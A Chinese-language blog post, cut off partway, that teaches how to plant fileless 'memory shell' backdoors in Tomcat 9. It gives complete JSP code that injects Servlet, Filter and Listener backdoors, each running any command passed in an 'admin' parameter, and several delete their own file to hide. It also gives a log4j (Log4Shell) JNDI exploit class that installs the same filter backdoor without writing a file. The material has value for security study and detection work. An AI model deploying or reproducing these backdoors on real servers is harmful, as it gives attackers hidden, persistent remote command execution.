    <content type="html"><![CDATA[<p>本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292</p><span id="more"></span><p>首先我们整理一下几种植入内存马的方式</p><ul><li>基于JSP WebShell植入内存马</li><li>基于JavaWeb RCE漏洞植入内存马<ul><li>真正的无文件落地内存马</li></ul></li><li>通过Java Agent植入内存马</li></ul><p>由于我们使用的是Tomcat，可以通过动态增加Servlet、Filter、Listener来植入内存马，如果技术栈还存在Spring和Shiro等，还可以使用增加Controller等方法</p><h2 id="基于JSP-WebShell植入内存马"><a href="#基于JSP-WebShell植入内存马" class="headerlink" title="基于JSP WebShell植入内存马"></a>基于JSP WebShell植入内存马</h2><blockquote><p>参考：<a href="https://github.com/bitterzzZZ/MemoryShellLearn/tree/main/jsp%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">MemoryShellLearn/jsp注入内存马 at main · bitterzzZZ/MemoryShellLearn (github.com)</a></p></blockquote><h3 id="配置开发环境"><a href="#配置开发环境" class="headerlink" title="配置开发环境"></a>配置开发环境</h3><p>IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9</p><p>为了在JSP中开发内存马，我们需要使用Tomcat的API，虽然在放在Tomcat中就可以直接使用Tomcat的API，但是IDEA无法进行代码提示，因此我们要在项目设置中把Apache Tomcat中的lib文件夹加入项目的Libraries中去，除此之外还要引入tomcat的<code>/bin/tomcat-juli.jar</code></p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126193430429.png" alt="image-20220126193430429"></p><p>完成Libraries的配置后我们的代码就不会因为缺少依赖而出现报错了</p><h3 id="增加Servlet"><a href="#增加Servlet" class="headerlink" title="增加Servlet"></a>增加Servlet</h3><p>Servlet我们都知道，是Tomcat的最基本的服务程序，我们可以直接在内存中增加Servlet来实现无文件的内存马</p><p>增加Servlet的方式分为3个步骤</p><ol><li>利用反射通过<code>ApplicationContextFacade</code>获取到<code>StandardContext</code></li><li>将<code>Servlet</code>程序封装到<code>Wrapper</code></li><li>将封装好的<code>Wrapper</code>增加到<code>StandardContext</code>中并添加地址映射</li></ol><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span>  IOException </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">            HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext(); <span class="comment">// 获取Context</span></span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">// 将Servlet添加到Context中去</span></span><br><span class="line">    BackdoorServlet backdoorServlet = <span class="keyword">new</span> BackdoorServlet();</span><br><span class="line">    org.apache.catalina.Wrapper backdoorWrapper = standardContext.createWrapper();</span><br><span class="line">    backdoorWrapper.setName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    backdoorWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    backdoorWrapper.setServlet(backdoorServlet);</span><br><span class="line">    backdoorWrapper.setServletClass(backdoorServlet.getClass().getName());</span><br><span class="line"><span class="comment">// jiang</span></span><br><span class="line">    standardContext.addChild(backdoorWrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="comment">// 自毁</span></span><br><span class="line"><span class="comment">//    (new File(application.getRealPath(request.getServletPath()))).delete();</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addServlet.jsp</code>写入内存马，然后再访问<code>/hello?admin=&lt;指令&gt;</code>就可以执行命令了</p><h3 id="增加Filter"><a href="#增加Filter" class="headerlink" title="增加Filter"></a>增加Filter</h3><p>由于Filter在Servlet之前运行，因此可以不受URL的限制，甚至可以伪装成在对一个正常的Servlet进行访问</p><p>增加Filter的方式分为4个步骤</p><ol><li>通过反射从<code>ApplicationContextFacade</code>中获取到当前的<code>StandardContext</code>，从<code>StandardContext</code>获取到<code>filterConfigs</code></li><li>封装<code>Filter</code>为<code>FilterDef</code>，并添加到<code>StandContext</code>中</li><li>生成新的<code>ApplicationFilterConfig</code>并添加到<code>filterConfigs</code>中</li><li>创建<code>FilterMap</code>并加入<code>StandardContext</code>中，为<code>Filter</code>确定适用的URL</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorFilter</span> <span class="keyword">extends</span> <span class="title">HttpFilter</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = <span class="string">&quot;BackdoorFilter&quot;</span>;</span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">    field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">        BackdoorFilter filter = <span class="keyword">new</span> BackdoorFilter();</span><br><span class="line">        <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="comment">// 自毁</span></span><br><span class="line">        (<span class="keyword">new</span> File(application.getRealPath(request.getServletPath()))).delete();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addFilter.jsp</code>写入内存马，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><h3 id="增加Listener"><a href="#增加Listener" class="headerlink" title="增加Listener"></a>增加Listener</h3><p>Tomcat的Listener可以用于在某个事件发生时执行操作，我们选择实现<code>ServletRequestListener</code>来监听每一个HTTP请求</p><p>增加Listener的方式分为2个步骤</p><ol><li>利用反射通过<code>ApplicationContextFacade</code>获取到<code>StandardContext</code></li><li>将<code>Listener</code>添加到<code>StandardContext</code>中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorListener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    standardContext.addApplicationEventListener(<span class="keyword">new</span> BackdoorListener());</span><br><span class="line">    <span class="comment">// 自毁</span></span><br><span class="line">    (<span class="keyword">new</span> File(application.getRealPath(request.getServletPath()))).delete();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addListener.jsp</code>写入内存马，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><p>介绍完Tomcat JSP内存马，接下来我们进入真正无文件落地的基于JNDI和反序列化植入内存马</p><h2 id="基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例"><a href="#基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例" class="headerlink" title="基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例"></a>基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例</h2><blockquote><p>关于CVE-2021-44228的分析，可以参见我之前的<a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/">讲解文章</a>，由于我使用remote codebase方法，本节只能使用jdk 8u181及以下的版本</p></blockquote><h3 id="准备Tomcat脆弱环境"><a href="#准备Tomcat脆弱环境" class="headerlink" title="准备Tomcat脆弱环境"></a>准备Tomcat脆弱环境</h3><p>首先在Tomcat项目的<code>pom.xml</code>中加入log4j-core 2.14.1的依赖，然后我们再写一个触发log4j漏洞的Servlet</p><blockquote><p>直接在自动创建的HelloServlet上修改即可</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.JavaWebDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造Exploit"><a href="#构造Exploit" class="headerlink" title="构造Exploit"></a>构造Exploit</h3><p>我们只尝试增加Filter，增加Servlet和Listener的方法也比较相似，不重复讨论</p><p>接下来按照我之前的CVE-2021-44228分析中的方法触发JNDI漏洞，我们将反弹Shell的代码进行修改</p><p>这时候遇到一个难点，之前我们使用JSP获取内存马，可以发现，往Tomcat中注入内存马的核心是需要获取到StandardContext实例，之前JSP会自动放进去一个request对象，可以用于获取StandardContext，但是此时没有这个便捷的方式，所以我们要另寻出入了</p><p>参考这篇文章：<a href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法 - 先知社区 (aliyun.com)</a></p><p>由于我们使用Tomcat9，此处我们使用”从ContextClassLoader获取”的方式为例来获取<code>StandardContext</code>，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure><p>整合Exploit，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BackdoorFilter</span> <span class="keyword">extends</span> <span class="title">HttpFilter</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">                <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(req, res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String name = <span class="string">&quot;BackdoorFilter&quot;</span>;</span><br><span class="line">        <span class="comment">// 从ContextClassLoader获取StandardContext</span></span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">        Field field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">            BackdoorFilter filter = <span class="keyword">new</span> BackdoorFilter();</span><br><span class="line">            <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">            FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">            filterConfigs.put(name, filterConfig);</span><br><span class="line">            <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">            FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先触发log4j漏洞，利用JNDI执行我们的Exploit植入内存马，随后访问任意URL时带上admin参数即可执行命令</p><p>可以发现，在这种情况下，我们实现了真正的<strong>无文件落地</strong>，但是JNDI+LDAP的攻击方式在jdk 8u191及之后就无法利用了，下一节我们讨论基于反序列化的植入方法</p><h2 id="基于反序列化的内存马植入-ysoserial-CommonsCollections2改造"><a href="#基于反序列化的内存马植入-ysoserial-CommonsCollections2改造" class="headerlink" title="基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造"></a>基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造</h2><blockquote><p>参考：<a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p></blockquote><p>由于CommonsCollections2使用了TemplatesImpl，所以我们才能用这个方法进行内存马注入，像CommonsCollections1没有利用TemplatesImpl，所以就不行了</p><h3 id="配置反序列化环境"><a href="#配置反序列化环境" class="headerlink" 